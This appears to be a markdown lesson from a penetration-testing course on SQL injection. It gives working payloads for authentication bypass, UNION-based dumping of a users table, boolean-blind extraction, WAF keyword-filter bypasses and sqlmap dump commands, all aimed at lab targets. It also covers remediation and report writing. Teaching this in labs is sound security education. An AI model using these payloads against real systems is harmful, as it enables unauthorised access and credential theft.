@@ -1,0 +1,227 @@
+# Web Module — Lesson 1: SQL Injection
+
+**Methodology phase:** Exploitation (after you've enumerated the app and found a parameter that talks to a database).
+**Why this lesson is first in Web:** SQLi is the classic high-impact web finding, it shows up on the PT1 web section, and learning it teaches you how to *reason about* injection — which transfers straight to XSS, command injection, and SSTI.
+
+> **Prerequisites for this lesson:** read `web/00-how-the-web-works.md` first (you need to know what a *parameter*, *request*, and *database query* are), and set up **Burp Suite** now via `web/06-burp-suite-workflow.md` — §6 of this lesson uses it, and every later web lesson does too. Burp is taught in Lesson 6 only because you needed to meet the vulnerabilities first to see why it matters; in practice, set it up before you start attacking.
+
+---
+
+## 1. The concept
+
+A web app builds a database query by gluing your input into a string:
+
+```php
+// Vulnerable login check (PHP + MySQL)
+$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
+```
+
+If you send `username = admin` the query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' AND password = '...'
+```
+
+But your input isn't separated from the query *structure* — it's pasted right into it. So if you send `username = ' OR '1'='1' -- ` the query becomes:
+
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
+```
+
+Read that carefully:
+
+- The leading `'` closes the `username` string early.
+- `OR '1'='1'` makes the `WHERE` clause always true.
+- `-- ` (dash-dash-space) is a SQL comment. Everything after it — including the password check — is ignored.
+
+The app thinks a valid user logged in. That's SQL injection: **your data is being interpreted as code because the query structure and the user input were never kept apart.**
+
+> The root cause is *always* the same: string concatenation instead of parameterised queries (prepared statements). Say that in your report's remediation section and you'll be right every time.
+
+---
+
+## 2. The four types you must recognise
+
+The exam won't label the injection for you. You classify it by how the app leaks information back:
+
+| Type | How you know | How you extract data |
+|---|---|---|
+| **In-band / UNION** | The app shows query results on the page | `UNION SELECT` to append your own rows |
+| **Error-based** | The app prints database error messages | Force errors that leak data in the message |
+| **Boolean-blind** | Page changes (true vs false) but shows no data | Ask yes/no questions, one bit at a time |
+| **Time-blind** | Page looks identical either way | Make the DB *sleep* on "true" and time the response |
+
+Blind injection is slow by hand — that's what `sqlmap` is for (Section 6). But you must be able to *prove* the injection manually first, because on the report you need to show the exact request that triggered it.
+
+---
+
+## 3. Finding the injection point
+
+Before exploiting, confirm the parameter is injectable. The cheapest probes, in order:
+
+```
+'
+```
+A single quote. If it breaks the page or throws a SQL error, the input reaches the query unescaped. **This one character is your fastest signal.**
+
+```
+' OR 1=1 -- -
+' OR 1=1 #
+```
+Two comment styles because it depends on the database. `-- -` (with the trailing dash so the space isn't stripped) works on most; `#` is a MySQL comment. Try both.
+
+```
+' AND 1=1 -- -      (page loads normally = true)
+' AND 1=2 -- -      (page changes/breaks = false)
+```
+If those two behave differently, you have **boolean-blind** injection even when nothing is printed.
+
+> **Flag-by-flag habit starts now.** Every payload you send, note *what you expected* and *what happened*. That table becomes your report evidence.
+
+---
+
+## 4. Worked example — UNION injection, start to flag
+
+Room to do this live: **[TryHackMe — SQL Injection](https://tryhackme.com/room/sqlinjectionlm)**. What follows is the reasoning, dead ends kept in.
+
+**Setup.** A product page loads with `http://10.10.x.x/product?id=1`. Enumeration (Recon module) already told us it's PHP + MySQL.
+
+**Step 1 — probe.**
+```
+http://10.10.x.x/product?id=1'
+```
+The page throws `You have an error in your SQL syntax`. Injectable, and it's **error-based friendly** (it prints errors). Good.
+
+**Step 2 — find the number of columns.** UNION only works if your `SELECT` returns the *same number of columns* as the original query. Two ways; I use `ORDER BY` because it's cleaner:
+```
+?id=1 ORDER BY 1 -- -     -> page OK
+?id=1 ORDER BY 2 -- -     -> page OK
+?id=1 ORDER BY 3 -- -     -> page OK
+?id=1 ORDER BY 4 -- -     -> "Unknown column '4' in 'order clause'"
+```
+It broke at 4, so the query returns **3 columns**.
+
+> **Dead end I hit the first time:** I jumped straight to `UNION SELECT 1,2,3,4` and got a generic error, then wasted ten minutes assuming the injection was fake. It wasn't — I just had the column count wrong. `ORDER BY` finds the count without guessing. Lesson: confirm column count *before* building the UNION.
+
+**Step 3 — find which columns print.** Send a UNION with markers so you can see which values land on the page:
+```
+?id=0 UNION SELECT 1,2,3 -- -
+```
+Note `id=0` — a non-existent product, so the *original* row returns nothing and only *our* injected row shows. The page prints `2` and `3`. So columns 2 and 3 are our output channels.
+
+**Step 4 — enumerate the database.** Now put real queries in columns 2 and 3:
+```
+?id=0 UNION SELECT 1,database(),version() -- -
+```
+Returns the current database name and MySQL version. Say the DB is `shop`.
+
+List the tables in it:
+```
+?id=0 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='shop' -- -
+```
+`information_schema` is the built-in metadata database — it describes every other database. You'll see a `users` table.
+
+List its columns:
+```
+?id=0 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
+```
+Returns `username`, `password`.
+
+**Step 5 — dump the loot.** `group_concat` mashes many rows into one string, and `0x3a` is a hex colon separator so the output is readable:
+```
+?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
+```
+Out come `admin:5f4dcc3b5aa765d61d8327deb882cf99` and friends. That hash is a job for the next module (`hydra`/`hashcat`), but you've proven full database read access — a critical-severity finding.
+
+---
+
+## 5. The comment and quote gotchas that eat hours
+
+- **`--` needs a trailing space** in SQL. In a URL the space often gets stripped, so use `-- -` or `-- +` (the `+` decodes to a space). This one tripped up half the people I've watched.
+- **Your quote must match the query's quote.** If the app used `"$user"` (double quotes) your `'` won't break out — try `"`.
+- **Sometimes there's no quote at all** (numeric context: `WHERE id = $id`). Then you don't need a quote to break out: `?id=1 OR 1=1 -- -` works directly.
+- **WAF/filter stripping keywords?** That's beyond entry-level, but know the tell: `UNION` gets blocked but `UNioN` or `/**/UNION/**/` slips through.
+
+---
+
+## 6. sqlmap — when to reach for it, and when not to
+
+`sqlmap` automates everything above, and it's essential for blind injection where manual extraction would take hours. But **prove the injection manually first** — you need the exact request for the report, and blindly firing sqlmap at everything is how you spend the exam attacking a parameter that was never vulnerable.
+
+```bash
+sqlmap -u "http://10.10.x.x/product?id=1" --batch --dbs
+```
+- `-u` — the target URL with the injectable parameter.
+- `--batch` — don't prompt me; take the default answer to every question. Keeps it non-interactive.
+- `--dbs` — enumerate the databases once injection is confirmed.
+
+Drill down:
+```bash
+sqlmap -u "http://10.10.x.x/product?id=1" --batch -D shop --tables
+sqlmap -u "http://10.10.x.x/product?id=1" --batch -D shop -T users --dump
+```
+- `-D shop` — target the `shop` database.
+- `-T users` — target the `users` table.
+- `--dump` — extract its contents. `sqlmap` even offers to crack the hashes it finds.
+
+For a POST request (a login form), capture the request in Burp, save it to a file, and:
+```bash
+sqlmap -r login.req --batch --dbs
+```
+- `-r login.req` — read the whole HTTP request from a file. This is the reliable way to handle POST bodies, cookies, and headers — far less error-prone than rebuilding the request with `--data` flags.
+
+> **Exam note:** sqlmap is loud and slow. On a timed exam, a five-minute manual UNION beats a twenty-minute sqlmap crawl. Use manual for in-band, sqlmap for blind.
+
+---
+
+## 7. Exercises
+
+Do these on the linked rooms, in your own Kali VM. Try before opening the solutions.
+
+**Exercise 1 — Authentication bypass.**
+Room: **[TryHackMe — SQL Injection](https://tryhackme.com/room/sqlinjectionlm)**, login challenge.
+Log in as `admin` without knowing the password. Write down the exact payload and *why* it works, clause by clause.
+
+**Exercise 2 — Column counting.**
+On a UNION-injectable endpoint, determine the column count two different ways (`ORDER BY` and `UNION SELECT NULL,NULL,...`). Which gave a cleaner signal, and why?
+
+**Exercise 3 — Blind boolean, by hand.**
+Find an endpoint where no data is printed but the page differs on true vs false. Extract the *first character* of the database name manually using `SUBSTRING()` and a comparison. (You're proving you understand what sqlmap automates.)
+
+**Exercise 4 — Report the finding.**
+Write a 200-word report entry for Exercise 1: title, severity, affected endpoint, reproduction steps with the exact request, impact, and remediation. This is the graded skill — practise it every time.
+
+---
+
+<details>
+<summary><b>Solutions & debrief (open after trying)</b></summary>
+
+**Exercise 1.** Payload in the username field: `admin' -- -` (comment out the password check entirely), or `' OR 1=1 -- -` to match the first row. Clause by clause: `admin'` closes the username string and matches the admin row; `-- -` comments out ` AND password = '...'` so the password is never checked. It works because input is concatenated into the query with no parameterisation.
+
+**Exercise 2.** `ORDER BY n` is usually cleaner: it fails the moment `n` exceeds the real column count with a specific error (`Unknown column 'n' in 'order clause'`), so you binary-search the count. `UNION SELECT NULL,NULL,...` also works and is handy when `ORDER BY` is filtered, but it returns a generic "columns don't match" error that's easy to misread as "not injectable."
+
+**Exercise 3.** Example true/false pair:
+```
+?id=1 AND SUBSTRING(database(),1,1)='s' -- -   (page normal = first char is 's')
+?id=1 AND SUBSTRING(database(),1,1)='a' -- -   (page changes = wrong guess)
+```
+`SUBSTRING(database(),1,1)` takes the 1st character, length 1. You walk the alphabet per position. Tedious by hand — which is exactly why `sqlmap` exists, and why you should let it do blind extraction on the exam.
+
+**Exercise 4 — model finding.**
+> **Title:** Authentication bypass via SQL injection in login form (Critical).
+> **Endpoint:** `POST /login`, `username` parameter.
+> **Reproduction:** Submit `username=admin' -- -` with any password. Server returns an authenticated admin session.
+> **Impact:** Full authentication bypass; combined with UNION extraction, complete read of the `users` table including password hashes. An attacker gains admin access with no credentials.
+> **Remediation:** Use parameterised queries / prepared statements so input is never concatenated into SQL. Apply least-privilege to the DB account and add input validation as defence in depth.
+
+</details>
+
+---
+
+## 8. What to carry forward
+
+- Injection is one idea — *data treated as code* — and you'll meet it again in XSS (Lesson 3), command injection, and SSTI. The reasoning transfers.
+- Manual first, tools second. The exam and the report both need the exact request.
+- The remediation is always "parameterise the query." Bank that sentence.
+
+**Next lesson:** `web/02-idor-and-access-control.md` — finding data you shouldn't be able to reach, the flaw class that reviewers say shows up heavily on the PT1 web section.
